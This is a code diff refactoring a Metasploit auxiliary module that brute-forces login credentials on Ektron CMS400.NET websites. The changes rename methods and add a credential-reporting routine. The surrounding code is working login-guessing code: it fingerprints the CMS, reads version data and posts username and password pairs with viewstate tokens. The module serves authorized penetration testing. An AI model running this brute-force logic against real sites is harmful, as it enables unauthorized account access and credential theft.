@@ -37,12 +37,12 @@ class Metasploit3 < Msf::Auxiliary
           ])
       ], self.class)
 
-    # "Set to false to prevent account lockouts - it will!"
+    # Set to false to prevent account lockouts - it will!
     deregister_options('BLANK_PASSWORDS')
   end
 
   def target_url
-    #Function to display correct protocol and host/vhost info
+    # Function to display correct protocol and host/vhost info
     if rport == 443 or ssl
       proto = "https"
     else
@@ -74,8 +74,8 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
 
-      #Check for HTTP 200 response.
-      #Numerous versions and configs make if difficult to further fingerprint.
+      # Check for HTTP 200 response.
+      # Numerous versions and configs make if difficult to further fingerprint.
       if (res and res.code == 200)
         print_status("Ektron CMS400.NET install found at #{target_url}  [HTTP 200]")
 
@@ -93,7 +93,7 @@ class Metasploit3 < Msf::Auxiliary
           eventvalidation = ""
         end
 
-        GetVersion()
+        get_version
 
         print_status "Testing passwords at #{target_url}"
         each_user_pass { |user, pass|
@@ -109,9 +109,9 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def GetVersion
-      #Attempt to retrieve the version of CMS400.NET installed.
-      #Not always possible based on version/config.
+  def get_version
+      # Attempt to retrieve the version of CMS400.NET installed.
+      # Not always possible based on version/config.
       payload = "http://#{vhost}:#{rport}/WorkArea/java/ektron.site-data.js.ashx"
       res = send_request_cgi(
       {
@@ -124,11 +124,38 @@ class Metasploit3 < Msf::Auxiliary
       end
   end
 
-  def do_login(user=nil, pass=nil, viewstate=viewstate, eventvalidation=eventvalidation)
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def do_login(user=nil, pass=nil, viewstate_arg=viewstate, eventvalidation_arg=eventvalidation)
     vprint_status("#{target_url} - Trying: username:'#{user}' with password:'#{pass}'")
 
-    post_data =  "__VIEWSTATE=#{Rex::Text.uri_encode(viewstate.to_s)}"
-    post_data << "&__EVENTVALIDATION=#{Rex::Text.uri_encode(eventvalidation.to_s)}"
+    post_data =  "__VIEWSTATE=#{Rex::Text.uri_encode(viewstate_arg.to_s)}"
+    post_data << "&__EVENTVALIDATION=#{Rex::Text.uri_encode(eventvalidation_arg.to_s)}"
     post_data << "&username=#{Rex::Text.uri_encode(user.to_s)}"
     post_data << "&password=#{Rex::Text.uri_encode(pass.to_s)}"
 
@@ -141,17 +168,7 @@ class Metasploit3 < Msf::Auxiliary
 
       if (res and res.code == 200 and res.body.to_s.match(/LoginSuceededPanel/i) != nil)
         print_good("#{target_url} [Ektron CMS400.NET] Successful login: '#{user}' : '#{pass}'")
-        report_auth_info(
-          :host         => rhost,
-          :port         => rport,
-          :sname => (ssl ? 'https' : 'http'),
-          :user         => user,
-          :pass         => pass,
-          :proof        => "WEBAPP=\"Ektron CMS400.NET\", VHOST=#{vhost}",
-          :source_type  => "user_supplied",
-          :duplicate_ok => true,
-          :active       => true
-        )
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
 
       elsif(res and res.code == 200)
         vprint_error("#{target_url} [Ekton CMS400.NET] - Failed login as: '#{user}'")
